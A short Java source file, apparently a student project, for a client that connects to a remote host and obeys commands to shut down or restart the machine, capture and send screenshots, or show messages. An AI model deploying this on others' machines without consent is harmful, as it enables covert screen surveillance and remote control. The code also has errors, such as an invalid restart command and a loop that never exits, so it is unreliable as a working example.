/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package gui;

import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;
import javax.imageio.ImageIO;
import javax.swing.JOptionPane;
/**
 *
 * @author pankaj
 */
public class client {
  public static void main(String []args){
      try{Runtime r;
       BufferedImage screenshot;
        ObjectOutputStream out;
         Dimension d=Toolkit.getDefaultToolkit().getScreenSize();
        Socket sock=new Socket("yadav",1300);
       while(true)
       {  PrintWriter pb=new PrintWriter(sock.getOutputStream());
      Scanner kb=new Scanner(sock.getInputStream());
      switch(kb.nextLine())
      {case "Shutdown":
          r=Runtime.getRuntime();
          r.exec("shutdown -s");
          break;
      case "Screenshot":
       
          out=new ObjectOutputStream(sock.getOutputStream());
          screenshot =new Robot().createScreenCapture(new Rectangle(d));
                        ImageIO.write(screenshot, "png", out);
                    continue;
      case "send message":
     JOptionPane.showMessageDialog(null,kb.nextLine(),"MESSAGE",JOptionPane.INFORMATION_MESSAGE);
     continue;
      case "restart":
          r=Runtime.getRuntime();
          r.exec("restart -r");
          continue;
      case "close":
             sock.close();
             pb.close();
            break;
      }}
 
      }
        catch(Exception e1)
        {
            System.out.println("Error:"+e1);
        }    
}
}